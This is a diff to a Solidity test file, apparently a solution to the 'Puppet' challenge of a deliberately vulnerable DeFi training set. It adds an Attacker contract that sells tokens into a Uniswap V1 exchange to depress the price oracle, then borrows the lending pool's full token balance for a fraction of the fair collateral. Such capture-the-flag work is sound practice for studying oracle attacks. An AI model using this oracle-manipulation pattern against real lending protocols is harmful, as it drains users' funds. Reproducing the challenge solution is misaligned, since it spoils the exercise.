@@ -115,15 +115,16 @@ contract PuppetChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_puppet() public checkSolvedByPlayer {
-      
-        token.approve(address(uniswapV1Exchange), 749 ether);
-        uniswapV1Exchange.tokenToEthSwapInput(
-            749 ether, // tokens_sold
-            1, // min_eth
-            type(uint256).max // deadline
+       
+
+        Attacker attacker = new Attacker{value: PLAYER_INITIAL_ETH_BALANCE}(
+            token,
+            lendingPool,
+            uniswapV1Exchange
         );
-        // console.log(token.balanceOf(player), player, player);
-        lendingPool.borrow{value: player.balance}(
+        token.transfer(address(attacker), PLAYER_INITIAL_TOKEN_BALANCE);
+        attacker.attack(
+            PLAYER_INITIAL_TOKEN_BALANCE,
             POOL_INITIAL_TOKEN_BALANCE,
             recovery
         );
@@ -159,4 +160,35 @@ contract PuppetChallenge is Test {
             "Not enough tokens in recovery account"
         );
     }
+}
+
+contract Attacker  {
+    DamnValuableToken token;
+    PuppetPool lendingPool;
+    IUniswapV1Exchange uniswapV1Exchange;
+
+    constructor(
+        DamnValuableToken _token,
+        PuppetPool _lendingPool,
+        IUniswapV1Exchange _uniswapV1Exchange
+    ) payable {
+        token = _token;
+        lendingPool = _lendingPool;
+        uniswapV1Exchange = _uniswapV1Exchange;
+    }
+
+    function attack(
+        uint256 swapBalance,
+        uint256 borrowBalance,
+        address recovery
+    ) public {
+        token.approve(address(lendingPool.uniswapPair()), swapBalance);
+        uniswapV1Exchange.tokenToEthSwapInput(swapBalance, 1, block.timestamp);
+        uint256 depositRequired = lendingPool.calculateDepositRequired(
+            borrowBalance
+        ) + 1;
+        lendingPool.borrow{value: depositRequired}(borrowBalance, recovery);
+    }
+
+    receive() external payable {}
 }
